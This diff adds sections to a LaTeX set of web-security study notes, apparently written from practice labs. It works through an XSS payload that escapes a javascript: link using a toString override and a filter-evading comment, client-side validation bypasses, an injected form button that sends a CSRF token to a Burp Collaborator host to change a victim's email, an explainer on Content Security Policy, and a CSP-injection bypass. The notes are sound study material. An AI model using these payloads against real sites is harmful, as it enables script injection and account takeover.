@@ -7,6 +7,9 @@
 \usepackage{listings}
 \usepackage{hyperref}
 \usepackage{multicol}
+\usepackage{amsmath}
+\usepackage{xcolor}
+\usepackage{tcolorbox}
 \lstset{numbers=none, basicstyle=\ttfamily}
 \renewcommand{\lstlistingname}
 
@@ -696,6 +699,367 @@ z(document.cookie);  // Executes in window scope
     \item \textbf{User clicks} the link
     \item \texttt{alert(1)} executes in browser context
 \end{enumerate}
+
+\rule{15cm}{0.4pt}
+
+\section*{URL Injection Payload Analysis}
+
+\subsection*{Original Vulnerable Code}
+\begin{lstlisting}[frame=single]
+<a href="javascript:fetch('/analytics', {
+    method:'post',
+    body:'/post%3fpostId%3d4'
+}).finally(_ => window.location = '/')">Back to Blog</a>
+\end{lstlisting}
+
+\subsection*{Working Payload}
+
+\begin{lstlisting}[frame=single]
+&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
+\end{lstlisting}
+
+\subsection*{\underline{Payload Component Breakdown}}
+
+\textbf{1. Break Out of String Context}
+\begin{lstlisting}[frame=single]
+&'},
+\end{lstlisting}
+\begin{itemize}
+    \item \texttt{\&} - Parameter separator
+    \item \texttt{'} - Closes the single quote in \texttt{body:'...'}
+    \item \texttt{\},} - Closes the fetch options object
+\end{itemize}
+
+\textbf{Result after injection:}
+\begin{lstlisting}[frame=single]
+body:'/post?postId=4&'},[PAYLOAD CONTINUES...]
+\end{lstlisting}
+
+\textbf{2. Function Definition \& Override}
+\begin{lstlisting}[frame=single]
+x=x=>{throw/**/onerror=alert,1337},toString=x,
+\end{lstlisting}
+\begin{itemize}
+    \item \texttt{x=x=>\{...\}} - Creates arrow function assigned to x
+    \item \texttt{throw/**/onerror=alert,1337} - Key execution trick
+    \item \texttt{toString=x} - Overrides toString method with malicious function\\
+    Now anyObject.toString() will call our function instead of the native one
+\end{itemize}
+
+\textbf{3. Trigger Execution}
+\begin{lstlisting}[frame=single]
+window+'',
+\end{lstlisting}
+\begin{itemize}
+    \item \texttt{window+''} - Forces string conversion of window object
+    \item Triggers \texttt{window.toString()} calling malicious function
+    \item Result: \texttt{alert(1337)} executes
+\end{itemize}
+
+\textbf{4. Clean Up Syntax}
+\begin{lstlisting}[frame=single]
+,{x:'
+\end{lstlisting}
+\begin{itemize}
+    \item \texttt{\{x:'} - Starts new object to fix syntax
+    \item Keeps JavaScript valid after injection
+\end{itemize}
+
+\subsection*{Complete Execution Flow}
+
+\textbf{After Injection:}
+\begin{lstlisting}[frame=single]
+javascript:fetch('/analytics', {
+    method:'post', 
+    body:'/post?postId=4&'},x=x=>{throw/**/onerror=alert,1337},
+    toString=x,window+'',{x:''
+}).finally(_ => window.location = '/')
+\end{lstlisting}
+
+\subsection*{\underline{Why /**/ is Used}}
+
+\textbf{Purpose: Bypass Space Filtering}
+\begin{lstlisting}[frame=single]
+// Without comment - might be blocked:
+throw onerror=alert,1337
+
+// With comment - bypasses filters:
+throw/**/onerror=alert,1337
+\end{lstlisting}
+
+\textbf{What It Achieves:}
+\begin{itemize}
+    \item Some WAFs block spaces between keywords
+    \item \texttt{/**/} acts as a space substitute
+\end{itemize}
+\rule{15cm}{0.4pt}
+
+\subsection*{\textbf{\underline{client-side validation bypass}}}
+\begin{enumerate}
+\item \textbf{Enabling a Disabled Button Using Developer Tools} $\Longrightarrow$
+Remove the disabled attribute from the button element.
+\item \textbf{Changing form input type} $\Longrightarrow$ ex. from email to text
+\item \textbf{Changing form maxlength}
+\item \textbf{remove or change form pattern}
+\end{enumerate}
+
+\newpage
+\textbf{\underline{NOTE}} Change the payload to foo@example.com"><img src= onerror=alert(1)>, embedding it within a valid email format. This makes the input appear legitimate in order to bypass client-side validation.\\ 
+\rule{15cm}{0.4pt}
+\subsection*{\textbf{\underline{Attack Flow}}}
+Bypass client-side validation $\Longrightarrow$ Inject malicious button $\Longrightarrow$ Redirect form to external server $\Longrightarrow$ Capture CSRF token $\Longrightarrow$ Use token to change email
+
+\textbf{\underline{A payload to Redirect form to external server and Capture CSRF token }}
+\begin{lstlisting}[frame=single]
+                      <!-- By inject a button -->
+https://vulnWebSite.net/my-account?email=test@test"><button formaction=
+"https://BURP-COLLABORATOR-SUBDOMAIN.net" formmethod="get">Click</button>
+\end{lstlisting}
+
+\textbf{\underline{The idea:}} CSP blocked scripts but allowed form redirection \& Server-side sanitization escaped scripts but allowed safe HTML\\
+\rule{15cm}{0.4pt}
+
+
+\section*{What is CSP?}
+
+\textbf{Content Security Policy (CSP)} is a security standard that helps prevent cross-site scripting (XSS), clickjacking, and other code injection attacks. It allows website owners to control which resources the browser is allowed to load.
+
+\subsection{How CSP Works}
+
+\subsubsection{Basic Concept}
+CSP works by telling browsers:
+\begin{itemize}
+    \item \textbf{What's allowed}: Which sources are trusted for different types of content
+    \item \textbf{What's blocked}: Everything else gets blocked automatically
+\end{itemize}
+
+\subsubsection{The CSP Header}
+Websites send CSP rules via HTTP headers:
+\begin{lstlisting}[frame=single]
+Content-Security-Policy: default-src 'self';
+                         script-src 'self' https://trusted.cdn.com
+\end{lstlisting}
+
+\section{Common CSP Directives}
+
+\subsection{Resource Directives}
+\begin{lstlisting}[backgroundcolor=\color{gray!10}]
+script-src    # Controls JavaScript sources
+style-src     # Controls CSS sources
+img-src       # Controls image sources
+font-src      # Controls font sources
+connect-src   # Controls AJAX/WebSocket connections
+media-src     # Controls video/audio sources
+frame-src     # Controls frame/iframe sources
+\end{lstlisting}
+
+\subsection{Special Values}
+\begin{lstlisting}[ backgroundcolor=\color{gray!10}]
+'self'           # Allow from same origin
+'none'           # Block everything
+'unsafe-inline'  # Allow inline scripts/styles (DANGEROUS)
+'unsafe-eval'    # Allow eval() (DANGEROUS)
+https:           # Allow from any HTTPS source
+data:            # Allow data: URLs
+\end{lstlisting}
+
+\section{CSP in Action - Examples}
+
+\subsection{Example 1: Strict Policy}
+\begin{lstlisting}[frame=single]
+Content-Security-Policy: 
+  default-src 'self';
+  script-src 'self';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+\end{lstlisting}
+
+\textbf{What this allows:}
+\begin{itemize}
+    \item  Scripts from same domain only
+    \item  Styles from same domain + inline styles
+    \item  Images from same domain, data URLs, and any HTTPS source
+    \item  Everything else blocked
+\end{itemize}
+
+\section{Why CSP is Important}
+
+\subsection{Without CSP}
+\begin{lstlisting}[language=HTML, frame=single]
+<!-- Attacker can inject malicious scripts -->
+<script>stealCookies();</script>
+<img src="x" onerror="maliciousCode()">
+\end{lstlisting}
+
+\subsection{With CSP}
+\begin{lstlisting}[frame=single]
+Content-Security-Policy: script-src 'self'
+\end{lstlisting}
+\begin{itemize}
+    \item  Inline scripts blocked
+    \item  Event handlers blocked  
+    \item  External scripts from untrusted sources blocked
+    \item  Only scripts from same origin allowed
+\end{itemize}
+
+
+
+\section{CSP Violations - What Happens}
+
+\subsection{Browser Behavior}
+\begin{enumerate}
+    \item \textbf{Detects violation} - Resource doesn't match policy
+    \item \textbf{Blocks resource} - Doesn't load/execute
+    \item \textbf{Reports violation} - Sends report to specified endpoint
+\end{enumerate}
+
+\subsection{Example Violation}
+If policy is \texttt{script-src 'self'} but page tries:
+\begin{lstlisting}[language=HTML, backgroundcolor=\color{gray!10}, frame=single]
+<script src="https://evil.com/hack.js"></script>
+\end{lstlisting}
+
+\textbf{Browser blocks it and reports:}
+\begin{lstlisting}[ backgroundcolor=\color{gray!10}, frame=single]
+{
+  "csp-report": {
+    "document-uri": "https://example.com/page",
+    "violated-directive": "script-src",
+    "blocked-uri": "https://evil.com/hack.js"
+  }
+}
+\end{lstlisting}
+
+\section{Implementing CSP}
+
+\subsection{Method 1: HTTP Header (Recommended)}
+\begin{lstlisting}[backgroundcolor=\color{gray!10}]
+Content-Security-Policy: default-src 'self'; script-src 'self'
+\end{lstlisting}
+
+\subsection{Method 2: HTML Meta Tag}
+\begin{lstlisting}[language=HTML, backgroundcolor=\color{gray!10}]
+<meta http-equiv="Content-Security-Policy" 
+      content="default-src 'self'; script-src 'self'">
+\end{lstlisting}
+\rule{15cm}{0.4pt}
+
+
+
+
+\section{CSP Injection Attack -> XSS attack}
+
+\subsection{The Scenario}
+This is a \textbf{CSP Injection Attack} where we can inject our own Content Security Policy directives into the website's security header.
+
+\section{Step-by-Step Attack Breakdown}
+
+\subsection{Step 1: Initial Testing}
+\textbf{What we do:}
+\begin{lstlisting}[language=HTML, frame=single]
+<img src=1 onerror=alert(1)>
+\end{lstlisting}
+
+\textbf{What happens:}
+\begin{itemize}
+    \item The payload gets reflected in the page (you can see it in the HTML)
+    \item But the script doesn't execute
+    \item \textbf{Why?} CSP is blocking it!
+\end{itemize}
+
+\subsection{Step 2: Investigate the CSP}
+\textbf{What we discover:}
+\begin{itemize}
+    \item Look at the HTTP response headers
+    \item There's a \texttt{Content-Security-Policy} header
+    \item It contains a \texttt{report-uri} directive with a \texttt{token} parameter
+\end{itemize}
+
+\textbf{Example of what the CSP might look like:}
+\begin{lstlisting} [backgroundcolor=\color{gray!10}, frame=single]
+Content-Security-Policy: default-src 'self'; script-src 'self';
+ report-uri /csp-report?token=abc123
+\end{lstlisting}
+
+\subsection{Step 3: The Vulnerability}
+\textbf{Key insight:} The \texttt{token} parameter value is included directly in the CSP header, and we can control it through the URL!
+
+This means if we visit:
+\begin{lstlisting} [backgroundcolor=\color{gray!10}, frame=single]
+https://site.com?token=OUR_INJECTION
+\end{lstlisting}
+
+The CSP becomes:
+\begin{lstlisting} [backgroundcolor=\color{gray!10}, frame=single]
+Content-Security-Policy: ... report-uri /csp-report?token=OUR_INJECTION
+\end{lstlisting}
+
+\subsection{Step 4: Crafting the Exploit}
+\textbf{The attack URL:}
+\begin{lstlisting} [ frame=single]
+https://site.com/?
+search=<script>alert(1)</script>
+&token=;script-src-elem 'unsafe-inline'
+\end{lstlisting}
+
+\textbf{Let's break this down:}
+
+\textbf{Part 1: The search parameter}
+\begin{itemize}
+    \item \texttt{search=\%3Cscript\%3Ealert\%281\%29\%3C\%2Fscript\%3E}
+    \item This is URL-encoded for: \texttt{<script>alert(1)</script>}
+    \item This is our XSS payload that will execute
+\end{itemize}
+
+\textbf{Part 2: The injection}
+\begin{itemize}
+    \item \texttt{token=;script-src-elem 'unsafe-inline'}
+    \item The semicolon \texttt{;} ends the current directive
+    \item Then we add our own CSP directive
+\end{itemize}
+
+\section{How the Injection Works}
+
+\subsection{Before Injection}
+Original CSP:
+\begin{lstlisting} [backgroundcolor=\color{gray!10}, frame=single]
+Content-Security-Policy: 
+  default-src 'self';
+  script-src 'self';
+  report-uri /csp-report?token=default_value
+\end{lstlisting}
+
+\subsection{After Injection}
+Modified CSP:
+\begin{lstlisting} [backgroundcolor=\color{gray!10}, frame=single]
+Content-Security-Policy: 
+  default-src 'self';
+  script-src 'self';
+  report-uri /csp-report?token=;script-src-elem 'unsafe-inline'
+\end{lstlisting}
+
+The browser sees this as:
+\begin{itemize}
+    \item \texttt{report-uri /csp-report?token=} (incomplete but harmless)
+    \item \texttt{script-src-elem 'unsafe-inline'} (NEW DIRECTIVE WE ADDED)
+\end{itemize}
+
+
+\subsection{The Chain of Events}
+\begin{enumerate}
+    \item \textbf{We inject} our CSP directive allowing inline scripts
+    \item \textbf{The page reflects} our \texttt{<script>alert(1)</script>} payload
+    \item \textbf{Browser checks CSP} - sees inline scripts are now allowed
+    \item \textbf{Script executes} - alert box pops up!
+\end{enumerate}
+
+
+\section{Summary}
+
+\begin{tcolorbox}[title=Key Takeaway]
+This attack demonstrates a critical vulnerability: \textbf{when you can control the CSP, you control what scripts can run}. By injecting a directive that allows inline scripts, we bypassed all of CSP's XSS protection and could execute arbitrary JavaScript.
+\end{tcolorbox}
+
 
 
 
